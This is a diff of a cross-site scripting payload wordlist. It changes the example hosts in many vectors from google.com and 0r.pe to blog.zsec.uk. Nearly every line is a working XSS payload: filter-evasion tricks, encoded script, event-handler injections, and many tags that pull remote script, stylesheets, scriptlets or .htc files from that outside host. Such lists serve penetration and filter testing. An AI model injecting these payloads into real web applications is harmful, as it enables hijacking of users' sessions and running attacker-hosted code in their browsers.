@@ -157,7 +157,7 @@ IE vector location='&#118&#98&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#11
 innerText DOM XSS: innerHTML=innerText  
 Using IE XSS filter or Chrome xss auditor to block <meta> url redirect.  
 jQuery 1.8 a new method: $.parseHTML('<img src=xx:X onerror=alert(1)>')  
-IE all version CSRF vector <img lowsrc=//google.com>  
+IE all version CSRF vector <img lowsrc=//blog.zsec.uk>  
 Timing vector <img src=//ixss.sinaapp.com/sleep.php> 
 Firefox data uri can inherit dom-access. <iframe src="data:D,<script>alert(top.document.body.innerHTML)</script>">  
 IE9 <script/onload=alert(1)></script> 
@@ -192,11 +192,11 @@ Firefox <a href="https://4294967298915183000">click</a>=>google by @garethheyes
 <a href="data:text/html;base64xoxoxox,<body/onload=alert(1)>">click</a> by @kkotowicz 
 Opera <a href="data:text/html;base64,PHN2Zy萨9vbmxv晕YWQ<>>9YWxlc>>>nQoMSk">click</a> variant base64 encode. by @jackmasa 
 Opera <svg><image x:href="data:image/svg-xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"> by LeverOne H5SC#88 
-Webkit and Opera <a href="\/www.google.com/favicon.ico">click</a>
+Webkit and Opera <a href="\/www.blog.zsec.uk/favicon.ico">click</a>
 FF <a href="//ⓜⓜⓜⓔ︒ⓜⓔ">click</a> url trick by @jackmasa 
 IE <script>-{valueOf:location,toString:[].pop,0:'vbscript:alert%281%29',length:1}</script> @thornmaker , @sirdarckcat 
 <i/onclick=URL=name> IE less xss,20 chars. by @0x6D6172696F 
-<a rel="noreferrer" href="//google.com">click</a>
+<a rel="noreferrer" href="//blog.zsec.uk">click</a>
 FF <img src="jar:!/"> no referrer by @sneak_ 
 No dos expression vector <i style=x:expression(alert(URL=1))>
 <svg><style>*{font-family:'<svg onload=alert(1)>';}</style></svg>
@@ -220,7 +220,7 @@ Opera <svg><animation x:href=javascript:alert(1)> SVG animation vector by @0x6D6
 FF <a href="data:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">CLICK</a> by @0x6D6172696F 
 <noscript><!--</noscript><img src=xx:x onerror=alert(1) --> non-IE 
 <svg><script xlink:href="data:,alert(1)"> by @0x6D6172696F 
-Firefox statusline spoofing<math><maction actiontype="statusline#http://google.com" href="//evil">click by LeverOne  
+Firefox statusline spoofing<math><maction actiontype="statusline#http://blog.zsec.uk" href="//evil">click by LeverOne  
 <svg><oooooo/oooooooooo/onload=alert(1) > by @jackmasa 
 <math><script>sgl='<img/src=xx:x onerror=alert(1)>'</script> chrome firefox opera vector by @jackmasa 
 FF <applet code=javascript:alert('sgl')> by @jackmasa 
@@ -317,11 +317,11 @@ Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>
-<SCRIPT/SRC="http://0r.pe/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=//0r.pe/.j>
+<SCRIPT SRC=//blog.zsec.uk/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://0r.pe/scriptlet.html <
+<iframe src=http://blog.zsec.uk/scriptlet.html <
 ";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
@@ -335,10 +335,10 @@ Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 <BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-<LINK REL="stylesheet" HREF="http://0r.pe/xss.css">
-<STYLE>@import'http://0r.pe/xss.css';</STYLE>
-<META HTTP-EQUIV="Link" Content="<http://0r.pe/xss.css>; REL=stylesheet">
-<STYLE>BODY{-moz-binding:url("http://0r.pe/xssmoz.xml#xss")}</STYLE>
+<LINK REL="stylesheet" HREF="http://blog.zsec.uk/xss.css">
+<STYLE>@import'http://blog.zsec.uk/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://blog.zsec.uk/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://blog.zsec.uk/xssmoz.xml#xss")}</STYLE>
 <STYLE>@import'javascript:alert("XSS")';</STYLE>
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
 <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
@@ -356,7 +356,7 @@ Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 " onhover="j&#x61;vascript:&#x61;lert(-1)"
 "><script>alert('test')</script>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//></SCRIPT>--!><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<SCRIPT SRC=http://0r.pe/xss.js></SCRIPT>
+<SCRIPT SRC=http://blog.zsec.uk/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
@@ -400,13 +400,13 @@ S
 "
 >
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT/XSS SRC="http://0r.pe/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
 <BODY onload!#$%&()*~+_.,:;?@[/|\]^`=alert("XSS")>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://0r.pe/xss.js?<B>
-<SCRIPT SRC=//0r.pe/.j>
+<SCRIPT SRC=http://blog.zsec.uk/xss.js?<B>
+<SCRIPT SRC=//blog.zsec.uk/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://0r.pe/scriptlet.html <
+<iframe src=http://blog.zsec.uk/scriptlet.html <
 <SCRIPT>a=/XSS/
 alert(a.source)</SCRIPT>
 ";alert('XSS');//
@@ -418,13 +418,13 @@ alert(a.source)</SCRIPT>
 <IMG LOWSRC="javascript:alert('XSS')">
 <BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
-<LAYER SRC="http://0r.pe/
+<LAYER SRC="http://blog.zsec.uk/
 scriptlet.html"></LAYER>
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-<LINK REL="stylesheet" HREF="http://0r.pe/xss.css">
-<STYLE>@import'http://0r.pe/xss.css';</STYLE>
-<META HTTP-EQUIV="Link" Content="<http://0r.pe/xss.css>; REL=stylesheet">
-<STYLE>BODY{-moz-binding:url("http://0r.pe/xssmoz.xml#xss")}</STYLE>
+<LINK REL="stylesheet" HREF="http://blog.zsec.uk/xss.css">
+<STYLE>@import'http://blog.zsec.uk/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://blog.zsec.uk/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://blog.zsec.uk/xssmoz.xml#xss")}</STYLE>
 <XSS STYLE="behavior: url(xss.htc);">
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
 <IMG SRC='vbscript:msgbox("XSS")'>
@@ -453,11 +453,11 @@ xss:&#101;x&#x2F;*XSS*//**pression(alert("XSS"))'>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->
 <BASE HREF="javascript:alert('XSS');//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://0r.pe/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://blog.zsec.uk/scriptlet.html"></OBJECT>
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
-<EMBED SRC="http://0r.pe/xss.swf" AllowScriptAccess="always"></EMBED>
+<EMBED SRC="http://blog.zsec.uk/xss.swf" AllowScriptAccess="always"></EMBED>
 <HTML xmlns:xss>
-<?import namespace="xss" implementation="http://0r.pe/xss.htc">
+<?import namespace="xss" implementation="http://blog.zsec.uk/xss.htc">
 <xss:xss>XSS</xss:xss>
 </HTML>
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
@@ -471,16 +471,16 @@ xss:&#101;x&#x2F;*XSS*//**pression(alert("XSS"))'>
 <?import namespace="t" implementation="#default#time2">
 <t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
 </BODY></HTML>
-<SCRIPT SRC="http://0r.pe/xss.jpg"></SCRIPT>
+<SCRIPT SRC="http://blog.zsec.uk/xss.jpg"></SCRIPT>
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD><SCRIPT>alert('XSS');</SCRIPT>
-<SCRIPT a=">" SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://0r.pe/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://0r.pe/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://blog.zsec.uk/xss.js"></SCRIPT>
 <A HREF="http://66.102.7.147/">XSS</A>
 <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 <A HREF="http://1113982867/">XSS</A>
@@ -488,14 +488,14 @@ xss:&#101;x&#x2F;*XSS*//**pression(alert("XSS"))'>
 <A HREF="http://0102.0146.0007.00000223/">XSS</A>
 <A HREF="h
 tt	p://6&#9;6.000146.0x7.147/">XSS</A>
-<A HREF="//www.google.com/">XSS</A>
+<A HREF="//www.blog.zsec.uk/">XSS</A>
 <A HREF="//google">XSS</A>
-<A HREF="http://0r.pe@google">XSS</A>
-<A HREF="http://google:0r.pe">XSS</A>
-<A HREF="http://google.com/">XSS</A>
-<A HREF="http://www.google.com./">XSS</A>
-<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
-<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+<A HREF="http://blog.zsec.uk@google">XSS</A>
+<A HREF="http://google:blog.zsec.uk">XSS</A>
+<A HREF="http://blog.zsec.uk/">XSS</A>
+<A HREF="http://www.blog.zsec.uk./">XSS</A>
+<A HREF="javascript:document.location='http://www.blog.zsec.uk/'">XSS</A>
+<A HREF="http://www.gohttp://www.blog.zsec.uk/ogle.com/">XSS</A>
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
@@ -510,7 +510,7 @@ tt	p://6&#9;6.000146.0x7.147/">XSS</A>
 &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
 <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>"
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
-<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><script xlink:href=data&colon;,window.open('https://www.blog.zsec.uk/')></script
 <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
 <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
@@ -592,7 +592,7 @@ http://www.<script>alert(1)</script .com
 <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 "><img src=x onerror=window.open('https://www.zsec.uk');>
 <form><button formaction=javascript&colon;alert(1)>CLICKME
-<math><a xlink:href="//0r.pe">click
+<math><a xlink:href="//blog.zsec.uk">click
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik></object>
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 1<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
@@ -600,7 +600,7 @@ http://www.<script>alert(1)</script .com
 <<scr\0ipt/src=http://xss.com/xss.js></script
 %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
 ' onmouseover=alert(/Black.Spook/)
-"><iframe%20src="http://google.com"%%203E
+"><iframe%20src="http://blog.zsec.uk"%%203E
 '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
 x”</title><img src%3dx onerror%3dalert(1)>
 <script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
@@ -699,7 +699,7 @@ http://www.<script>alert(1)</script .com
 <--`<img/src=` onerror=alert(1)> --!>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
 <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>?
-"><img src=x onerror=window.open('https://www.google.com/');>
+"><img src=x onerror=window.open('https://www.blog.zsec.uk/');>
 <form><button formaction=javascript&colon;alert(1)>CLICKME
 <math><a xlink:href="//jsfiddle.net/t846h/">click
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
